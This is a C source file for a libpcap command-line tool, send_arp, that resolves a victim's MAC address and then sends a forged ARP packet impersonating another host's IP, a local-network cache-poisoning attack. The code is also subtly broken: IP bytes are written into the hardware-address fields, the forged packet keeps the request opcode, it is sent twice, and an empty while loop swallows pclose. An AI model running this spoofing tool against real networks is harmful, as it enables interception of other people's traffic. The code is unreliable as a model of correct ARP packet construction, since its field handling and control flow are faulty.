#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap/pcap.h>
#include <sys/socket.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

#define ETH_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define ARP_LEN 42
#define ARP_HARD_TYPE_ETH 0x01
#define ETH_TYPE_IP 0x0800
#define ETH_TYPE_ARP 0x0806
#define ARP_REQUEST 0x01
#define ARP_REPLY 0x02

struct eth_hdr
{
    uint8_t eth_dst[ETH_ADDR_LEN];
    uint8_t eth_src[ETH_ADDR_LEN];
    uint16_t eth_type;
};

struct arp_hdr
{
    uint16_t hard_type;
    uint16_t proto_type;
    uint8_t hard_addr_len;
    uint8_t proto_addr_len;
    uint16_t opcode;
    uint8_t sender_hard_addr[ETH_ADDR_LEN];
    uint8_t sender_proto_addr[IP_ADDR_LEN];
    uint8_t target_hard_addr[ETH_ADDR_LEN];
    uint8_t target_proto_addr[IP_ADDR_LEN];
};

int get_my_mac(const char *dev, uint8_t *mac){
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;

    memset(&ifr, 0X00, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    int fd=socket(AF_INET, SOCK_DGRAM, 0);

    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
        perror("ioctl ");

    for(int i=0; i<6; i++)
        mac[i] = (u_int8_t *)ifr.ifr_hwaddr.sa_data[i];
    close(sock);

    return 0;
}

int get_my_ip(const char *dev, uint8_t *ip){
    char buf[100];
    FILE *fp;
    fp = popen("hostname -I", "r");
    if(fp == NULL)
        return -1;
    while(fgets(buf, sizeof(buf), fp))

    pclose(fp);
    sscanf(buf,"%u.%u.%u.%u",ip,ip+1,ip+2,ip+3);
}

int arp_request(pcap_t *handle, uint8_t *src_mac, uint8_t *dst_mac, uint8_t *sender_ip, uint8_t *target_ip, uint8_t *buf, int flag)
{
    struct eth_hdr *eth = (struct eth_hdr *)buf;
    struct arp_hdr *arp = (struct arp_hdr *)(eth+1);

    for(int i=0; i<ETH_ADDR_LEN; i++){
        eth->eth_dst[i] = dst_mac[i];
        eth->eth_src[i] = src_mac[i];
    }
    eth->eth_type = htons(ETH_TYPE_ARP);
    arp->hard_type = htons(ARP_HARD_TYPE_ETH);
    arp->proto_type = htons(ETH_TYPE_IP);
    arp->hard_addr_len = ETH_ADDR_LEN;
    arp->proto_addr_len = IP_ADDR_LEN;
    arp->opcode = htons(ARP_REQUEST);

    for(int i=0; i<ETH_ADDR_LEN; i++){
        arp->sender_hard_addr[i] = src_mac[i];

        if(flag == 0)
            arp->target_hard_addr[i] = 0x00;
        else
            arp->target_hard_addr[i] = dst_mac[i];
    }

    for(int i=0; i<IP_ADDR_LEN; i++){
        arp->sender_hard_addr[i] = sender_ip[i];
        arp->target_hard_addr[i] = target_ip[i];
    }

    pcap_sendpacket(handle, buf, 42);

    if(pcap_sendpacket(handle, buf, 42) == -1){
        printf("ARP REQUEST FAIL");
        return -1;
    }

    return 1;
}

int arp_reply(pcap_t *handle, uint8_t *target_ip, uint8_t *victim_mac){

    int flag = 0;

    while(1)
    {
        struct pcap_pkthdr * header;
        const uint8_t * packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct eth_hdr * eth = (struct eth_hdr *)packet;

        if(htons(eth->eth_type == ETH_TYPE_ARP))
        {
            struct arp_hdr *arp = (struct arp_hdr *)(eth+1);

            if(arp->opcode == htons(ARP_REPLY))
            {
                if((arp->sender_proto_addr[0] == target_ip[0]) &&
                        (arp->sender_proto_addr[1] == target_ip[1]) &&
                        (arp->sender_proto_addr[2] == target_ip[2]) &&
                        (arp->sender_proto_addr[3] == target_ip[3])){
                    for(int i=0; i<ETH_ADDR_LEN; i++)
                              victim_mac[i] = arp->sender_hard_addr[i];
                    flag = 1;
                }
            }
        }

        if(flag == 1)
            break;
    }
    return 1;
}

void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: send_arp eth0 172.20.10.5 172.20.10.2\n");
}

int main(int argc, char * argv[]){
    if(argc != 4){
        usage();
        return -1;
    }

    uint8_t my_mac[ETH_ADDR_LEN];
    uint8_t my_ip[IP_ADDR_LEN];
    uint8_t sender_mac[ETH_ADDR_LEN];
    uint8_t sender_ip[IP_ADDR_LEN];
    uint8_t target_ip[IP_ADDR_LEN];
    uint8_t buf[ARP_LEN];
    uint8_t broadcast_mac[ETH_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    char * dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL){
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    inet_pton(AF_INET, argv[2], sender_ip);
    inet_pton(AF_INET, argv[3], target_ip);
    get_my_mac(dev, my_mac);
    get_my_ip(dev, my_ip);

    arp_request(handle, my_mac, broadcast_mac, my_ip, target_ip, buf, 0);
    arp_reply(handle, target_ip, sender_mac);
    arp_request(handle, my_mac, sender_mac, sender_ip, target_ip, buf, 1);

    pcap_close(handle);
    return 0;
}
